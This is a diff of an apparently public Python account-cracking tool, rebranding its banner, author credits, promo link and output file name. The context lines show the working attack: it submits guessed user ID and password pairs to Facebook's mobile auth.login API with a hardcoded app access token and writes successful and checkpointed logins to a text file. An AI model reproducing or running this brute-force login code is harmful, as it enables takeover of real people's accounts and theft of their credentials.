@@ -389,24 +389,19 @@ def follow(ses,coki):
  
 logo = """
 \033[1;97m                                                
-   
-   ███████  ██████  ███    ███  █████  ██ ██      
-   ██      ██    ██ ████  ████ ██   ██ ██ ██      
-   ███████ ██    ██ ██ ████ ██ ███████ ██ ██      
-        ██ ██    ██ ██  ██  ██ ██   ██ ██ ██      
-   ███████  ██████  ██      ██ ██   ██ ██ ███████ 
+   ▀▄▀▄▀▄🅂🄷🄰🄷🅁🅄🄺🄷▀▄▀▄▀▄
                                                
  ╔══════════════════════════════════════════════╗
-    \33[0;41mPOWERD BY MUHAMMAD SOMAIL NEW PUBLIC TOOLS\33[0m
+    \33[0;41mPOWERD BY SHAHRUKH KHILJI NEW PUBLIC TOOLS\33[0m
  ╚══════════════════════════════════════════════╝
   ║_________\33[1;42mNew Tools 2022\33[0m____________║
     \33[1;37m╔═════════════════════════════╗
-    \33[1;37m╠══[Author   : MUHAMMAD SOMAIL║
-    \33[1;37m╠══[FACEBOOK : MUHAMMAD SOMAIL║
-    \33[1;37m╠══[CREATED  : SOMAIL BRAND   ║
+    \33[1;37m╠══[Author   : SHAHRUKH KHILJI║
+    \33[1;37m╠══[FACEBOOK : SHAH RUKH║
+    \33[1;37m╠══[CREATED  : SK TEAMS   ║
     \33[1;37m╠══[NETWORK  : \33[1;31mSPEED 4G \33[1;37m      ║
     \33[1;37m╠══[TOOLS    : \33[1;31mFREE \33[1;37m          ║
-    \33[1;32m╠══[VERSION  : \33[1;31m0.01 \33[1;32m          ║
+    \33[1;32m╠══[VERSION  : \33[1;31m0.0.0.1 \33[1;32m          ║
     \33[1;37m╚═════════════════════════════╝                 
 """
  
@@ -420,12 +415,12 @@ class Main:
 		print(logo)
 		print("")
 		print("╔════════════════════════════════════════════════════╗")
-		print("\033[1;37m  Note :  Approval Ka LiYa Channel Ko Subsacribe Kara")
+		print("\033[1;37m  Note :  Approval KAY LIYA MARE PAGE KO FELLOW KARO")
 		print("╚════════════════════════════════════════════════════╝")
 		
 		
 		print("")
-		print("\033[1;37m [1] First Subsacribe My Channel ")
+		print("\033[1;37m [1] First FELLOW My PAGE ")
 		print("\033[1;37m [2] Exit")
 		print("")
 		Baloch = input("\n\033[1;37m  Chose  \033[1;32m")
@@ -435,12 +430,12 @@ class Main:
 			print("    Thanks♥️")
 			exit()
 		elif Baloch in ["1", "01"]:
-			os.system("xdg-open https://youtube.com/channel/UCNW6oM8GOBzTVKkq3lTaqnw/")
+			os.system("xdg-open https://www.facebook.com/103865412259786/")
 			print("")
 			time.sleep(2.0)
 			print("\033[1;37m    Checking Subsacribetion")
 			print("")
-			input("\n\033[1;37m  Type You Are Channel Name \033[1;36m")
+			input("\n\033[1;37m  Type You Are FACEBOOK ACCOUNT  Name \033[1;36m")
 			time.sleep(2.1)
 			print("")
 			print("\033[1;37m Done ")
@@ -891,12 +886,12 @@ class Main:
 				print("\r \033[1;32m[SOMAIL-OK]%s | %s\033[1;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("SOMAIL-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("sk-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[SOMAIL-OK] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[sk-OK] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("SOMAIL-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("sk-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1319,15 +1314,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[SOMAIL-OK] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[1;32m[sk-OK] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("SOMAIL-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("sk-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[1;32m[SOMAIL-OK] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("SOMAIL-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("sk-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
